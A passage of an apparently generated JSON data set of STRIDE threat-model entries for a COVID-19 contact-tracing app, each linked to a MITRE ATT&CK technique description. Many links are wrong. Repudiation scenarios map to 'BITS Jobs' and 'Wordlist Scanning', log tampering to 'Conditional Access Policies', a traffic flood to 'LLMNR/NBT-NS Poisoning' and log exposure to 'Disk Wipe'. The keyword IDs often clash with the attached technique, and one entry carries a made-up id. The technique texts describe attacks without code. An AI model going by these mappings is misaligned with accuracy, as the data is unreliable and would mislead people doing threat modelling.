                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the central server and modifies the database of contact tracing information.",
            "Assumptions": [
                {
                    "Assumption": "Server has vulnerable software.",
                    "Role": "Server Administrator",
                    "Condition": "Valid if server software contains security vulnerabilities."
                },
                {
                    "Assumption": "Attacker has valid credentials or can bypass authentication.",
                    "Role": "Attacker",
                    "Condition": "Valid if authentication measures are weak or compromised."
                },
                {
                    "Assumption": "Database lacks appropriate access controls.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if database access permissions are poorly configured."
                }
            ],
            "Potential Impact": "Data confidentiality, integrity, and availability compromised.",
            "MITRE ATT&CK Keywords": [
                "T1548",
                "database tampering",
                "unauthorized access",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on a user device alters the app's data before it is sent to the central server, causing the server to process and store corrupted information.",
            "Assumptions": [
                {
                    "Assumption": "User device is infected with malware.",
                    "Role": "User",
                    "Condition": "Valid if endpoint security is inadequate."
                },
                {
                    "Assumption": "App does not validate data integrity before sending.",
                    "Role": "Developer",
                    "Condition": "Valid if there is no data validation mechanism."
                },
                {
                    "Assumption": "Server accepts data without validation.",
                    "Role": "Server Administrator",
                    "Condition": "Valid if server-side data integrity checks are absent or insufficient."
                }
            ],
            "Potential Impact": "Data integrity compromised, unreliable contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "T1505",
                "data tampering",
                "malware",
                "endpoint"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having been notified about a potential COVID-19 exposure to avoid quarantine or legal obligations.",
            "Assumptions": [
                {
                    "Assumption": "Notification logs are not immutable.",
                    "Role": "Developer",
                    "Condition": "Valid if notification logs can be altered or deleted."
                },
                {
                    "Assumption": "System lacks non-repudiation features.",
                    "Role": "Developer",
                    "Condition": "Valid if system design does not enforce non-repudiation."
                },
                {
                    "Assumption": "There is no user acknowledgment required.",
                    "Role": "Developer",
                    "Condition": "Valid if users are not required to acknowledge notifications."
                }
            ],
            "Potential Impact": "Data integrity compromised, accountability issues.",
            "MITRE ATT&CK Keywords": [
                "T1070",
                "repudiation",
                "log manipulation",
                "data deletion"
            ],
            "mitre_technique": {
                "name": "BITS Jobs",
                "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
                "id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
                "technique_id": "T1197"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare worker denies having submitted positive COVID-19 test results to avoid personal or professional repercussions.",
            "Assumptions": [
                {
                    "Assumption": "Test results are not digitally signed.",
                    "Role": "Healthcare Worker",
                    "Condition": "Valid if test results lack digital signatures."
                },
                {
                    "Assumption": "System does not log submission actions reliably.",
                    "Role": "Developer",
                    "Condition": "Valid if action logging is inconsistent or absent."
                },
                {
                    "Assumption": "There are no safeguards ensuring the authenticity of test results.",
                    "Role": "Developer",
                    "Condition": "Valid if systems do not verify health worker credentials during submission."
                }
            ],
            "Potential Impact": "Data integrity compromised, falsified information.",
            "MITRE ATT&CK Keywords": [
                "T1530",
                "repudiation",
                "audit manipulation",
                "credential misrepresentation"
            ],
            "mitre_technique": {
                "name": "Wordlist Scanning",
                "description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ",
                "id": "attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46",
                "technique_id": "T1595.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies involvement in unauthorized access or data tampering activities by altering or deleting relevant log records.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms can be manipulated.",
                    "Role": "Developer",
                    "Condition": "Valid if there are no protections against log tampering."
                },
                {
                    "Assumption": "Logs are stored without redundancy or protection.",
                    "Role": "Data Administrator",
                    "Condition": "Valid if logs lack redundancy or secured storage."
                },
                {
                    "Assumption": "System does not employ effective monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is inadequate monitoring or alerting on log alterations."
                }
            ],
            "Potential Impact": "Data integrity compromised, lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "T1070",
                "repudiation",
                "log tampering",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious actor intercepts unencrypted communications to obtain sensitive contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted unencrypted.",
                    "Role": "Developer",
                    "Condition": "Valid if communication channels are unencrypted."
                },
                {
                    "Assumption": "Network lacks encryption in transit.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if encryption is not used for network traffic."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network defenses can be bypassed by the attacker."
                }
            ],
            "Potential Impact": "Data confidentiality compromised, unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "T1071",
                "data disclosure",
                "network interception",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
                "technique_id": "T1588.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses storage locations (e.g., server, file system) containing unencrypted log files with sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored unencrypted.",
                    "Role": "Developer",
                    "Condition": "Valid if application logs sensitive data in plaintext."
                },
                {
                    "Assumption": "Storage lacks appropriate access controls.",
                    "Role": "Data Administrator",
                    "Condition": "Valid if access controls to storage locations are weak or improperly configured."
                },
                {
                    "Assumption": "Attacker has access to storage locations.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers can reach storage volumes."
                }
            ],
            "Potential Impact": "Data confidentiality compromised, unauthorized access to sensitive logs.",
            "MITRE ATT&CK Keywords": [
                "T1003",
                "data disclosure",
                "storage access",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Disk Wipe",
                "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
                "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
                "technique_id": "T1561"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A user device is compromised by malware, leading to unauthorized access to collected contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "User device security is weak.",
                    "Role": "User",
                    "Condition": "Valid if endpoint security measures are insufficient."
                },
                {
                    "Assumption": "App data is stored unencrypted on the device.",
                    "Role": "Developer",
                    "Condition": "Valid if local data storage is not encrypted."
                },
                {
                    "Assumption": "Malware has access to app data through compromised device.",
                    "Role": "Attacker",
                    "Condition": "Valid if malware is able to read and exfiltrate stored data."
                }
            ],
            "Potential Impact": "Data confidentiality compromised, unauthorized access to private information.",
            "MITRE ATT&CK Keywords": [
                "T1056",
                "data disclosure",
                "malware",
                "endpoint compromise"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with traffic, rendering the contact tracing service unavailable to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks robust traffic filtering mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if there are no strong DDoS protection methods in place."
                },
                {
                    "Assumption": "Attacker has sufficient resources to generate high traffic volumes.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can coordinate or control botnets or other resources to launch DDoS attacks."
                },
                {
                    "Assumption": "There is no rate limiting or load balancing.",
                    "Role": "Developer",
                    "Condition": "Valid if application does not include rate limiting or load balancing capabilities."
                }
            ],
            "Potential Impact": "System availability disrupted, legitimate users cannot access services.",
            "MITRE ATT&CK Keywords": [
                "T1499",
                "denial of service",
                "network",
                "traffic flooding"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious actor exploits a vulnerability in the app causing it to crash on user devices, interrupting contact tracing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "App contains unpatched vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Valid if there are known vulnerabilities not addressed."
                },
                {
                    "Assumption": "Users do not update their applications regularly.",
                    "Role": "User",
                    "Condition": "Valid if users are not prompted or do not choose to update apps."
                },
                {
                    "Assumption": "Attacker has knowledge of the vulnerability and can exploit it.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerability exploitation tools or techniques are publicly available or known to the attacker."
                }
            ],
            "Potential Impact": "System availability disrupted, app crash prevents functionality.",
            "MITRE ATT&CK Keywords": [
                "T1421",
                "denial of service",
                "app crash",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker performs a resource exhaustion attack on mobile devices, draining the battery and rendering the contact tracing app inoperable.",
            "Assumptions": [
                {
                    "Assumption": "App consumes significant system resources.",
                    "Role": "Developer",
                    "Condition": "Valid if the app requires a high level of CPU or memory."
                },
                {
                    "Assumption": "Device power management is not effectively managed.",
                    "Role": "Developer",
                    "Condition": "Valid if there's poor optimization for battery usage."
                },
                {
                    "Assumption": "Attacker can continuously interact with the app to deplete resources.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can maintain persistent interaction with the app."
                }
            ],
            "Potential Impact": "System availability disrupted, mobile devices become inoperable.",
            "MITRE ATT&CK Keywords": [
                "T1490",
                "denial of service",
                "resource exhaustion",
                "device impact"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains unauthorized administrative access to the central server through exploiting a vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "There are exploitable vulnerabilities in the server software.",
                    "Role": "Server Administrator",
                    "Condition": "Valid if server software is outdated or improperly secured."
                },
                {
                    "Assumption": "Administrator privileges are not securely controlled.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there are weak access controls or policies."
                },
                {
                    "Assumption": "Attacker has expertise to utilize the exploit.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker possesses the required skills or tools for exploitation."
                }
            ],
            "Potential Impact": "Data confidentiality, integrity, and availability compromised.",
            "MITRE ATT&CK Keywords": [
                "T1068",
                "elevation of privilege",
                "server",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--1068",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a flaw in the app to gain root access on their device, bypassing app restrictions and accessing protected data.",
            "Assumptions": [
                {
                    "Assumption": "The app contains code vulnerabilities allowing privilege escalation.",
                    "Role": "Developer",
                    "Condition": "Valid if there are unaddressed security flaws."
                },
                {
                    "Assumption": "Device security measures are not enforced.",
                    "Role": "Device Manufacturer",
                    "Condition": "Valid if devices are not secure by default or easily rootable."
                },
                {
                    "Assumption": "User has the knowledge to exploit the vulnerability.",
                    "Role": "User",
                    "Condition": "Valid if users have technical understanding or access to exploit scripts."
                }
            ],
            "Potential Impact": "Data confidentiality and integrity compromised, bypassing app restrictions.",
            "MITRE ATT&CK Keywords": [
                "T1069",
                "elevation of privilege",
                "device",
                "root access"
            ],
            "mitre_technique": {
                "name": "Securityd Memory",
                "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
                "technique_id": "T1555.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware on a compromised device exploits vulnerabilities to gain higher privileges, leading to unauthorized access to other apps and data.",
            "Assumptions": [
                {
                    "Assumption": "Device is not adequately protected against malware.",
                    "Role": "User",
                    "Condition": "Valid if device lacks sufficient anti-malware protection."
                },
                {
                    "Assumption": "Malware can exploit unknown or unpatched vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if there are zero-day vulnerabilities or unpatched software on the device."
                },
                {
                    "Assumption": "Vulnerabilities exist that allow privilege escalation.",
                    "Role": "Developer",
                    "Condition": "Valid if unmitigated vulnerabilities in app or OS exist."
                }
            ],
            "Potential Impact": "System integrity compromised, unauthorized access, wide-ranging data breaches.",
            "MITRE ATT&CK Keywords": [
                "T1600",
                "elevation of privilege",
                "malware",
                "device"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious user creates a fake application pretending to be the legitimate contact tracing application and tricks users into installing it.",
            "Assumptions": [
                {
                    "Assumption": "Users trust applications from unofficial sources.",
                    "Role": "User",
                    "Condition": "Users download and install applications from untrusted sources."
                },
                {
                    "Assumption": "There is no stringent verification process for app store submissions.",
                    "Role": "App Store Manager",
                    "Condition": "App stores do not have rigorous checks to detect fake applications."
                },
                {
                    "Assumption": "Users do not verify the authenticity of the application before installation.",
                    "Role": "User",
